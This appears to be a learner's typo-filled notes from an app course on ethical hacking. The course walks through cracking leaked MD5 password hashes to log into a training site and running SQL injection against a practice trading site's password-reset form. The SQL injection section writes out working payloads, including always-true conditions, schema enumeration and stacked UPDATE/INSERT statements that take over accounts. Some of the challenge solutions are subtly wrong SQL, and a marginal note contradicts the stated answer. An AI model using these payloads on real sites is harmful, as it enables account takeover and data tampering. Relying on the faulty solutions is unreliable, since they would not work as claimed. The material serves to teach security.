# Become a Hacker

## Programming 1
Done before
## Programming 2
Done before

## Introduction to Hacking

In this track, we're going to learn about what it takes to *become a hacker*.

We'll get to grips with the necessary skills an then perform a real-life hack. Are you ready?

### What we'll do

By the end of the track, we'll be hacking a training-ground *cryptocurrency trading webside*.

CoinDex

### What's hacking?

A hacker is a **person** who performs hacks, but what exactly does *hacking* involve?

*Exploiting a weakness in a computer or network

We're going to learn the skills needed to discover some common security weaknesses.

### Hacking ethics

Hacking used to have a bad reputation, but things ahve changed quite a bit. Today, it#s an important poart of online life.

Can you guess why?

* It helps discover and fix security risks

Spot on. We'll learn about what's called *ethical hacking* and how it helps make online life safer.

### The hacking skillset

To become an ethical hacker, we'll need a particular set of skills.

Can you imageine what some of them might be?

* Database skills
* Programming skills
* ~~Marketing skills~~
We'll need to have knowledge of programming and databases to achieve our hacking goals.

### Programming your hack

As *programming* is an important tool in the hacking tool belt, it's one of the first skills to learn.

What do you think programming could help us with?

* Breaking website security
* Cracking passwords
* Scanning for unsecured websites

Programming knowledge will help us discover security holes and understand our hacking tools better.

### Hiding things

As hackers, we'll often want to gain access to information that's hidden by secret codes.

What's the best way to figure out what's inside?

* by figuring out the keys for the codes
* by watching the people who send it

AWriting and solving codes is called *cryptography*, which will be one of thefrist skills we'll master.

## Digging into databases

Most webistes store their data in a database, which is accessed by a programming language called *SQL*.

Which of these things might interest a hacker?

* Email addresses
* Social Security Numbers
* Passwords

This kind of information is very useful for a hacker. We'regoing to learn how to access important data with *SQL*.

### What's coming up

There's a lot to consider when becoming a hacker, but it's an exciting path.

What's coming up will put you on track to becoming a master.

## Security Basics
Done before

## Password Hacking - Password finding

### Project
Let's flex our cryptography and password knowledge by exloring what can happen during a **real-life** security breach.

### Tools of the trade
For this project you'll need the help of a desktop web browser.

### Sensitive data
Hackers have gotten their hands on some *sensitive data*. It's stored on a server at leaks.hellocode.io.

head there wtih your prowser to check it out.

### Investigation
*Investigation* is an important part of the hacking process.

Let's take alook through the file dump and see if we can identify where the data is from.

### The *legal disclosure* file seems like a good place to start.

Is there something here that might lead us to the origin of the data?

### The Website

You found it! I seems that thanksgifing.com is the unfortunate victim of this hack.

Let's see if we can find anything else of interest back at leaks.hellocode.io.

### Leaky database
With some exploring you should have come across the `db_leak.html` file.

It seems that *user login table* from thanksgifing.com was leaked too.

### Login

Let's try to log into thanksgifing.com.

Use the Evank`username and password, which is the first entry in the db_leak.html file.

### Ceaser salad

That didn't seem to wokr. It looks like the passwords are *encoded*.

Might they be disguised with a *cipher*?

### hash browns?

The passwords are mostly the *same length* and look very *random*.

Aren't cryptographic hashes usually at least 32 characters in length?

### Cracked

Most are 32 characters long, meaning they could be using an unsafe *MD-5* hash.

Go to md5decrypt.net and follow the instructions to try and crack `Evank`s password *hash*.

### Strong vs weak

`Evank` seems to have a *strong password*, meaning we can't crack it.

Try with the next hash from the table, the one belonging to `DecDoh!`.

### Let's login
We have the `DecDoh!` username, and now we have the decoded password `Monkey`.

Let's try to login.

### We are in
We are now logged in as `DecDoh!`on thanksgifing.com. This was far too easy. A definite *security fail*.

Let's *Log Out* for now, an protect `DecDoh!`'s privacy.

### Knowledge is power
We just explored what can happen duringa real security breach.

With the right knowledge, we can protect ourselves from other hackers and their attempts to steal our sensitive data.

## SQL Fundamentals
Done before
## Attacks & Defenses
Done before
## Hack a Website - Poking around

### Project
In this project, we'll make our way into a *cryptocurrency trading website*.

### Training Ground

For this project, you'll only need a web browser to open https://coindex.co, which is a *training ground* for soon-to-be hackers like us.

### Plan

Every attack start with a *scanning phase* during which we try to gather as much information about the target as possible.

Open thwe website https://coindex.co in your web browser.

### Phase 1

Huh! It looks like we need to log in to get access to the website. There are input fields for the username and password, a login button, and a password reovery link.

We've already spotted two potential attack possibilities: the *input fields*.

### Try it
It's always a good start to enter valid input to get a better understanding of a website's inner workings.

Enter a random email address (e.g. `hack@getmimo.com`) and password, hit the *Login* button, and have a look at the results.

### Malicious?

It seems like the website displays a simple error code.

What about malicous code?

### Malicious!

Let's find out if the server can be affected by malicious *SQL* input!

To test this, add an apostrophe, `'`, at the end of the input. Type in `hack@getmimo.com`and `password'`. (Don't forget to actually add `to your input.)

Psst: We'll explore why `'` may be dangerous for SQL databases in a minute.

### Results?

Click on *Login*. Do we see any suspicious results?

### Dig deeper

Everything seems normal, but let's dig deeper! *Right-Click* on the input field and hit *Inspect* to open the *JavaScript console*.

Websites often log errors to the console. This could give us an additional hint on how to sneak into the platform.

### Not useful

Although there are a few errors, there's nothing really helpful here.

Close the JavaScript console by clicking on the `x` in the top right.

### Different angles

No luck so far. But maybe there's something else we can try.

Click on *Forgot password?* to see where it leads to.

### What's that?

Oh, another input field! Mgiht that be another attack option?

### Whats happening?

As we know, it's smart to play around with input to get a feeling for the logic. Let's try to enter something!

Again, type in a random email address and click on *Reset Password*.

### Again

Yikes, an error message! Who would've expected that?

Try to enter hack@getmimo.com' to prduce an error and click *Reset Password* again. Make sure to add the ' at the end.

### Server Error

Bingo! We've found a weakness: an *internal server error*. What a beauty!

You shouldn't assign interns to do password recovery features!

## Exploring the database

### Behind the Scences 1

Why did we get this error, though? WEll, behind the scenes, there might be a *SQL statement*.

```SQL
SELECT * FROM users WHERE email = 'INPUT';
```
Psst: `Input` will be replaced with your actual input.

If you send `hack@getmimo.com'`(with the apostrophe at the end) to the server, the server will encounter an unexpteced `'`and crash.

```SQL
SELECT * FROM users WHERE email = 'hack@getmimo.com'';
```

### More

In hacker terms, we've just injected `'`.

However, it's not just single characters that we can inject, we can sneak in entire strings as well.

### 1 = 1?

Let's try something a little more sophisticated!

Enter `x' OR '1' = '1` to force the statement to always evaluate to `true` and click *Reset Password* to see what happens.

```SQL
SELECT * FROM users WHERE email = 'x' OR '1' = '1';
```

### Reset?

It looks like the server has selected an entry from the 'users' table and sent an email to the email address in it.

Most likely, the modified statement returns every entery in the 'users' table and causes the server to send an email to a random person.

### Assumptions

Up to this point, we've assumed that the SQL statement behind the scenes selects `*`from `users`, but we don't really know what the fields are called.

```SQL
SELECT ?
FROM ?
WHERE ? = `INPUT`;
```

### EMail?

Might we be able to guess the names of the fields? A good guess is that the email field is called `email`.

In the *reset password input field*, enter the following to check if the field is really **is** called `email`.

```
X' AND email IS NULL; --
```

Make sure to add the `;`and the `--` at the end.

### Another error?

Another server error? It seems like the SQL table field isn't called `email`.

That's ok, sometimes hacking involves guesswork.

Use the statement from before and replace `email`with other *plausible names* until you get a *couldn't-find-user* error.

### Found?

Found it? High-fives!

In case you haven't we'll let you know in the next lesson. Maybe you wanna try a few more times before moving on? It's an easy one.

### Found!

The answer is `email_address`.
(i used 'emailaddress' and it worked)

Let's have a detailed look at why this worked.

### Detailed look

It worked because `email_address IS NULL` tries to find an `email_address`field and `--`introduces a SQL *comment*.

```SQL
SELECT ?
FROM ?
WHERE email_address = 'x' AND email_address IS NULL; -- ';
```
Without the comment, the `';`signs at the end of the statement would cause a server error.

### Explanation

The query below was our first attempt with `email`:

```SQL
SELECT ?
FROM ?
WHERE email_address = 'X' AND email IS NULL;-- ';
```
If the field doesn't exist (as it was the case for email IS NULL; --), the server throws an error. We saw another `500 Internal Server Error` but this could vary from application to application.

### Comment

But if we guess correctly and use `email_address`, the statement `email_address is NULL`will return `false`and the server won't find a user and returns the default error message.

```SQL
SELECT ?
FROM ?
WHERE email_address = `X` AND email_address IS NULL; --';
```

## Breaking in

### More field names?

As you already know, hacking involves a lot of trail and error. Can you discover other field names?

You should at least find the *ID* and *phone number* fields. If you're curious, there should also be a *full name* field and probably even more!

### Found?

Did you find `id`, `user_name`, and `phone`? You just need to replace `email_address` with one of the terms and you'll get the same error.

If you get a `500 Internal Server Error`, then it means you've typed in something that is **not** a field name.

### Users?
We already know about some of the fields in the table. But what about the *table name*? What would you call a table that holds users?

```SQL
SELECT ?
FROM users
WHERE email_address = `INPUT`;
```
What about just that, `users`? Let's find out!

### Users!

Modify the latest injection string a bit to find out if the table is called `users`.

```SQL
SELECT ?
FROM users
WHERE email_address = 'x' AND users.id IS NULL;-- ';
```

Enter `X' AND users.id IS NULL; --` to execute the statement and click *Reset Password*. You know it's correct if you don't get a 500 error.

### Users

That's a direct hit: the server returns a couldn't-find-user error.

### Notes

Let's see what we can work with and if we can piece together a plan.

```SQL
SELECT ?
FROM users
WHERE email_address = 'INPUT';
```

We know that there's a user with the *email address* `h4x0r@dark.net`, so let's try to use that information!

### Change that email!

How about we change the user's email address to our email address so that we can recieve the reset password email?

Enter the following code and click *reset Password*. don't worry about the error message; there's no user with the email 'x'.

```SQL
x'; UPDATE users SET email_address = 'dennisAzorn@gmail.com' WHERE email_address = 'h4x0r@dark.net'
```

### What the ..?

We've just entered `x'; UPDATE users SET email_address = 'me@me.com' WHERE email_address = 'h4x0r@dark.net';` and the server will execute the following command:
```SQL
UPDATE users
SET email_address = 'me@me.com'
WHERE email_address = 'h4x0r@dark.net';
```

Pretty great, huh?

### Email?

It seems like it worked, no? Now enter your email address and click on *Reset Password* to recieve the reset password email.

### Email!

Did you recieve an email with the new password? Epic!

Let's try it out!

### Go for gold!

Head back to the login page, type in your email address and the password from the password reset email, and hit the *Login* button.

### Does it work?

Woot! We're in and have access to the account data for the user `h4x0r@dark.net`!

### Challanges

After every project, there are three challenges that require you to experiment a little bit and come up with solutions.

Let's get going!

### Bronze
Change the ID of the user with the email address frank@dark.net to 123.

### Silver
Change the ID of a user with the front name 'Alice' to 456.
Do you remember the user_name field? you might need wildcards (%) because you don't know the full name.

### Gold
insert a new user for yourself into the database.

You need to take care of the email_address field.

### Bronze Solution

```SQL
x'; UPDATE users SET id = 123 WHERE email_address = 'frank@dark.net
```

### Silver Solution

```SQL
x'; UPDATE users SET id = 456 WHERE user_name = '%Alice%
```
Psst: we use the wildcards % to look for fields that contain Alice, as we dont know the full name.

### Gold solution

```SQL
x'; INSERT INTO users ('email_address') VALUES ('me@me.com'); --
```

Way to go! in the next project, we'll take another leap towards becoming hackers!

Remember that hacking can be used for good and bad purposes. We'll stay on the light side.

## Social Engineering
Done before